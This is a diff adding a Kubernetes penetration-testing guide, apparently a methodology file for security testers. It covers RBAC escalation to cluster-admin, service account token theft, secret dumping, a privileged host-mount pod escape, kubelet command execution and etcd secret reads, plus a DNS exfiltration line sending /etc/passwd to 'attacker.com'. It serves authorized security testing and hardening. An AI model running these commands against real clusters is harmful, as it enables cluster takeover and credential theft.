@@ -1,0 +1,510 @@
+<kubernetes_security_guide>
+<title>KUBERNETES SECURITY TESTING</title>
+
+<critical>Kubernetes orchestrates containerized workloads across clusters. Misconfigurations can lead to container escapes, lateral movement, data exposure, and complete cluster compromise. Testing must cover RBAC, service accounts, network policies, secrets management, and API server security.</critical>
+
+<scope>
+- RBAC (Role-Based Access Control) misconfiguration
+- Service account token abuse
+- Secret exposure and management
+- Network policy bypass
+- Namespace isolation escape
+- Pod security and container escape
+- API server attacks
+- etcd exposure
+</scope>
+
+<methodology>
+1. Enumerate cluster configuration and RBAC permissions.
+2. Test service account token capabilities.
+3. Probe network policies for bypass opportunities.
+4. Examine secrets and ConfigMaps for sensitive data.
+5. Test pod security and container configurations.
+</methodology>
+
+<cluster_enumeration>
+<initial_discovery>
+{% raw %}
+# Check current context and permissions:
+kubectl config current-context
+kubectl auth can-i --list
+
+# Get cluster info:
+kubectl cluster-info
+kubectl version
+
+# List namespaces:
+kubectl get namespaces
+
+# List all resources:
+kubectl get all --all-namespaces
+{% endraw %}
+</initial_discovery>
+
+<rbac_enumeration>
+{% raw %}
+# List cluster roles:
+kubectl get clusterroles
+kubectl get clusterrolebindings
+
+# List roles in namespace:
+kubectl get roles -n {namespace}
+kubectl get rolebindings -n {namespace}
+
+# Describe specific role:
+kubectl describe clusterrole {role}
+kubectl describe rolebinding {binding} -n {namespace}
+
+# Find privileged roles:
+kubectl get clusterroles -o json | jq '.items[] | select(.rules[].verbs | contains(["*"]))'
+{% endraw %}
+</rbac_enumeration>
+
+<service_account_enum>
+{% raw %}
+# List service accounts:
+kubectl get serviceaccounts --all-namespaces
+
+# Get service account details:
+kubectl describe serviceaccount {sa} -n {namespace}
+
+# Find service accounts with tokens:
+kubectl get secrets --all-namespaces | grep service-account-token
+
+# Get token from secret:
+kubectl get secret {sa-token-xxx} -n {namespace} -o jsonpath='{.data.token}' | base64 -d
+{% endraw %}
+</service_account_enum>
+</cluster_enumeration>
+
+<rbac_attacks>
+<privilege_escalation>
+{% raw %}
+# Dangerous RBAC permissions:
+
+# 1. Create/update roles (can grant self more permissions):
+kubectl auth can-i create roles
+kubectl auth can-i update clusterroles
+
+# 2. Bind roles (can bind privileged roles):
+kubectl auth can-i create rolebindings
+kubectl auth can-i create clusterrolebindings
+
+# 3. Impersonate users:
+kubectl auth can-i impersonate users
+kubectl auth can-i impersonate serviceaccounts
+
+# 4. Get secrets (includes SA tokens):
+kubectl auth can-i get secrets
+
+# 5. Create pods (can mount tokens/secrets):
+kubectl auth can-i create pods
+
+# 6. Exec into pods:
+kubectl auth can-i create pods/exec
+{% endraw %}
+</privilege_escalation>
+
+<rbac_exploitation>
+{% raw %}
+# Privilege escalation via role binding:
+
+# If can create RoleBinding, bind to cluster-admin:
+cat << EOF | kubectl apply -f -
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: escalate-binding
+subjects:
+- kind: User
+  name: attacker
+  apiGroup: rbac.authorization.k8s.io
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+  apiGroup: rbac.authorization.k8s.io
+EOF
+
+# Via impersonation:
+kubectl --as=admin get secrets
+
+# Via service account:
+kubectl --as=system:serviceaccount:{namespace}:{sa} get secrets
+{% endraw %}
+</rbac_exploitation>
+</rbac_attacks>
+
+<service_account_attacks>
+<token_abuse>
+{% raw %}
+# Service account token locations:
+
+# Mounted in pod:
+/var/run/secrets/kubernetes.io/serviceaccount/token
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+/var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+# Read token from inside pod:
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# Use token to access API:
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces
+{% endraw %}
+</token_abuse>
+
+<token_capabilities>
+{% raw %}
+# Test token permissions:
+
+APISERVER=https://kubernetes.default.svc
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# List pods:
+curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/pods
+
+# List secrets:
+curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets
+
+# List all resources:
+curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1
+
+# Create pod:
+curl -k -X POST -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d @pod.json $APISERVER/api/v1/namespaces/default/pods
+{% endraw %}
+</token_capabilities>
+
+<default_sa_abuse>
+{% raw %}
+# Default service account vulnerabilities:
+
+# Every pod has default SA mounted unless disabled
+# Default SA may have permissions if roles bound
+
+# Check default SA permissions:
+kubectl auth can-i --list --as=system:serviceaccount:default:default
+
+# Disable SA token mounting:
+# In Pod spec:
+spec:
+  automountServiceAccountToken: false
+
+# Or in ServiceAccount:
+automountServiceAccountToken: false
+{% endraw %}
+</default_sa_abuse>
+</service_account_attacks>
+
+<secrets_exposure>
+<secret_enumeration>
+{% raw %}
+# List all secrets:
+kubectl get secrets --all-namespaces
+
+# Get secret content:
+kubectl get secret {name} -n {namespace} -o yaml
+kubectl get secret {name} -n {namespace} -o jsonpath='{.data}'
+
+# Decode base64:
+kubectl get secret {name} -n {namespace} -o jsonpath='{.data.password}' | base64 -d
+
+# Common sensitive secrets:
+# - Docker registry credentials
+# - TLS certificates
+# - Database passwords
+# - API keys
+{% endraw %}
+</secret_enumeration>
+
+<secret_types>
+{% raw %}
+# Kubernetes secret types:
+
+kubernetes.io/service-account-token  # SA tokens
+kubernetes.io/dockerconfigjson       # Docker registry
+kubernetes.io/tls                    # TLS certs
+Opaque                               # Generic secrets
+
+# Enumerate by type:
+kubectl get secrets --all-namespaces -o json | \
+  jq '.items[] | select(.type == "kubernetes.io/tls")'
+{% endraw %}
+</secret_types>
+
+<env_secrets>
+{% raw %}
+# Secrets in environment variables:
+
+# Get pods with env secrets:
+kubectl get pods -o json | jq '.items[].spec.containers[].env[] | select(.valueFrom.secretKeyRef)'
+
+# Exec into pod to read env:
+kubectl exec -it {pod} -- env | grep -i secret
+kubectl exec -it {pod} -- env | grep -i password
+kubectl exec -it {pod} -- env | grep -i key
+{% endraw %}
+</env_secrets>
+</secrets_exposure>
+
+<network_policy_bypass>
+<policy_enumeration>
+{% raw %}
+# List network policies:
+kubectl get networkpolicies --all-namespaces
+
+# Describe policy:
+kubectl describe networkpolicy {name} -n {namespace}
+
+# Check for missing policies:
+# Namespaces without any NetworkPolicy have no network restrictions
+{% endraw %}
+</policy_enumeration>
+
+<bypass_techniques>
+{% raw %}
+# Network policy bypass:
+
+# 1. DNS-based exfiltration:
+# DNS (UDP 53) often allowed
+nslookup $(cat /etc/passwd | base64).attacker.com
+
+# 2. Via allowed services:
+# Access internal services that are allowed by policy
+# Use them as proxies
+
+# 3. Same namespace:
+# Policies may not restrict intra-namespace traffic
+
+# 4. Node-level access:
+# If can access node, bypass pod network policies
+
+# 5. Host network:
+# Pods with hostNetwork: true bypass pod network
+{% endraw %}
+</bypass_techniques>
+</network_policy_bypass>
+
+<namespace_escape>
+<namespace_enumeration>
+{% raw %}
+# List resources across namespaces:
+kubectl get pods --all-namespaces
+kubectl get services --all-namespaces
+
+# Access resources in other namespaces:
+# Via service DNS:
+curl http://{service}.{namespace}.svc.cluster.local
+
+# Via direct pod IP:
+kubectl get pods -n {namespace} -o wide
+curl http://{pod-ip}:{port}
+{% endraw %}
+</namespace_enumeration>
+
+<cross_namespace_attacks>
+{% raw %}
+# Cross-namespace service access:
+
+# If NetworkPolicy doesn't restrict:
+curl http://database.production.svc.cluster.local:5432
+
+# Enumerate services:
+kubectl get services --all-namespaces
+
+# Scan internal network:
+# From inside pod, scan cluster CIDR
+{% endraw %}
+</cross_namespace_attacks>
+</namespace_escape>
+
+<pod_security>
+<privileged_pods>
+{% raw %}
+# Find privileged pods:
+kubectl get pods --all-namespaces -o json | \
+  jq '.items[] | select(.spec.containers[].securityContext.privileged == true)'
+
+# Find pods with host paths:
+kubectl get pods --all-namespaces -o json | \
+  jq '.items[] | select(.spec.volumes[].hostPath)'
+
+# Find pods with host network:
+kubectl get pods --all-namespaces -o json | \
+  jq '.items[] | select(.spec.hostNetwork == true)'
+
+# Find pods with host PID:
+kubectl get pods --all-namespaces -o json | \
+  jq '.items[] | select(.spec.hostPID == true)'
+{% endraw %}
+</privileged_pods>
+
+<container_escape>
+{% raw %}
+# Container escape techniques:
+
+# 1. Privileged container:
+# Full host access
+nsenter --target 1 --mount --uts --ipc --net --pid
+
+# 2. Host path mount:
+# /var/run/docker.sock mounted
+docker -H unix:///var/run/docker.sock ps
+
+# 3. Capabilities:
+# CAP_SYS_ADMIN, CAP_NET_ADMIN
+# Allow various escapes
+
+# 4. PID namespace:
+# hostPID: true allows process viewing/manipulation
+
+# 5. Kernel exploits:
+# If kernel vulnerable and container not isolated
+{% endraw %}
+</container_escape>
+
+<create_privileged_pod>
+{% raw %}
+# Create privileged pod for escape:
+
+cat << EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-pod
+spec:
+  containers:
+  - name: privileged
+    image: ubuntu
+    command: ["/bin/bash", "-c", "sleep 3600"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: host-volume
+  volumes:
+  - name: host-volume
+    hostPath:
+      path: /
+EOF
+
+kubectl exec -it privileged-pod -- chroot /host
+{% endraw %}
+</create_privileged_pod>
+</pod_security>
+
+<api_server_attacks>
+<unauthenticated_access>
+{% raw %}
+# Test for anonymous access:
+curl -k https://{api-server}:6443/api
+curl -k https://{api-server}:6443/version
+
+# Anonymous might have permissions:
+curl -k https://{api-server}:6443/api/v1/namespaces
+curl -k https://{api-server}:6443/api/v1/pods
+
+# Check if anonymous RBAC is configured:
+kubectl get clusterrolebindings -o json | \
+  jq '.items[] | select(.subjects[].name == "system:anonymous")'
+{% endraw %}
+</unauthenticated_access>
+
+<kubelet_attacks>
+{% raw %}
+# Kubelet API (port 10250):
+
+# Read-only port (10255):
+curl http://{node-ip}:10255/pods
+
+# Authenticated kubelet:
+curl -k https://{node-ip}:10250/pods
+
+# Execute commands:
+curl -k -X POST "https://{node-ip}:10250/run/{namespace}/{pod}/{container}" \
+  -d "cmd=id"
+
+# Get container logs:
+curl -k "https://{node-ip}:10250/containerLogs/{namespace}/{pod}/{container}"
+{% endraw %}
+</kubelet_attacks>
+
+<etcd_exposure>
+{% raw %}
+# etcd contains all cluster data:
+
+# Common ports: 2379, 2380
+
+# Check for exposed etcd:
+curl http://{etcd-ip}:2379/v2/keys
+
+# With etcdctl:
+etcdctl --endpoints=http://{etcd-ip}:2379 get / --prefix --keys-only
+
+# Read secrets from etcd:
+etcdctl --endpoints=http://{etcd-ip}:2379 get /registry/secrets --prefix
+{% endraw %}
+</etcd_exposure>
+</api_server_attacks>
+
+<common_payloads>
+{% raw %}
+# Permission check:
+kubectl auth can-i --list
+kubectl auth can-i create pods
+
+# Secret extraction:
+kubectl get secrets -A -o yaml
+
+# Service account token:
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Privileged pod:
+kubectl run --rm -it --image=ubuntu --overrides='{"spec":{"containers":[{"name":"c","image":"ubuntu","securityContext":{"privileged":true}}]}}'
+
+# API access from pod:
+curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate RBAC misconfiguration with privilege escalation.
+2. Show service account token abuse for cluster access.
+3. Prove secret exposure with extracted credentials.
+4. Document container escape or namespace bypass.
+5. Provide kubectl commands for reproduction.
+</validation>
+
+<false_positives>
+- Properly configured RBAC with least privilege
+- Network policies restricting pod communication
+- Pod security policies/admission preventing privileged pods
+- Service account token mounting disabled
+- Secrets encrypted at rest and properly scoped
+</false_positives>
+
+<impact>
+- Complete cluster compromise via RBAC escalation
+- Data breach via secret exposure
+- Lateral movement via service account abuse
+- Container escape to node compromise
+- Denial of service via resource manipulation
+- Supply chain attacks via deployment modification
+</impact>
+
+<pro_tips>
+1. Always enumerate RBAC permissions first.
+2. Check for service account tokens mounted in pods.
+3. Look for secrets in environment variables.
+4. Test network policies for cross-namespace access.
+5. Identify privileged pods and containers.
+6. Check for exposed kubelet API.
+7. Test anonymous access to API server.
+8. Look for host path mounts to node filesystem.
+9. Enumerate services across all namespaces.
+10. Check etcd exposure for direct cluster data access.
+</pro_tips>
+
+<remember>Kubernetes security is about defense in depth: RBAC should follow least privilege, network policies should restrict pod communication, pod security should prevent privileged containers, and secrets should be encrypted and scoped. A single misconfiguration can chain to complete cluster compromise. Always enumerate from the perspective of what a compromised pod can access.</remember>
+</kubernetes_security_guide>
